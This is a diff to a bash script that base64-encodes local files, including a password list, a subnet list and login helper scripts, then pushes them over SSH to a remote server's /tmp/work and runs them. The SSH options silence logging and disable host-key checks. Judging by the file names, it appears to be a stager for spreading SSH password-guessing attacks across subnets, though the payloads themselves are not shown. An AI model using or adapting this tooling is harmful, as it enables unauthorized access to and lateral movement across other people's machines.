@@ -4,12 +4,14 @@ PASS=$2
 SERVER=$3
 echo $1 $2 $3
 
-SCRIPT_PATH=/tmp/work
-REMOTE_SCRIPT_PATH=/tmp/yes
+SCRIPT_PATH="$(pwd)"
+echo $SCRIPT_PATH
+REMOTE_SCRIPT_PATH=/tmp/work
 HELP_SCRIPT=`base64 --wrap=0 ${SCRIPT_PATH}/linuxloginhelper`
 PASS_SCRIPT=`base64 --wrap=0 ${SCRIPT_PATH}/passwdlist.txt`
 SCRIPT_SCRIPT=`base64 --wrap=0 ${SCRIPT_PATH}/script.sh`
 LOGIN_SCRIPT=`base64 --wrap=0 ${SCRIPT_PATH}/thelinuxlogin`
+SUBNETS=`base64 --wrap=0 ${SCRIPT_PATH}/subnets.txt`
 SSH_OPTIONS="-oLogLevel=error"
 SSH_OPTIONS="${SSH_OPTIONS} -oStrictHostKeyChecking=no"
 SSH_OPTIONS="${SSH_OPTIONS} -oUserKnownHostsFile=/dev/null"
@@ -18,9 +20,11 @@ CMD="${CMD} base64 -d - > ${REMOTE_SCRIPT_PATH}/linuxloginhelper <<< ${HELP_SCRI
 CMD="${CMD} base64 -d - > ${REMOTE_SCRIPT_PATH}/passwdlist.txt <<< ${PASS_SCRIPT};"
 CMD="${CMD} base64 -d - > ${REMOTE_SCRIPT_PATH}/script.sh <<< ${SCRIPT_SCRIPT};"
 CMD="${CMD} base64 -d - > ${REMOTE_SCRIPT_PATH}/thelinuxlogin <<< ${LOGIN_SCRIPT};"
-CMD="${CMD} chmod u+x ${REMOTE_SCRIPT_PATH}/linuxloginscript;"
+CMD="${CMD} base64 -d - > ${REMOTE_SCRIPT_PATH}/subnets.txt <<< ${SUBNETS};"
+CMD="${CMD} chmod u+x ${REMOTE_SCRIPT_PATH}/linuxloginhelper;"
 CMD="${CMD} chmod u+x ${REMOTE_SCRIPT_PATH}/thelinuxlogin;"
-CMD="${CMD} bash $REMOTE_SCRIPT_PATH/t"
+CMD="${CMD} bash $REMOTE_SCRIPT_PATH/script.sh"
+#CMD="${CMD} bash $REMOTE_SCRIPT_PATH/linuxloginhelper"
 
 echo $CMD
 echo $SSH_OPTIONS
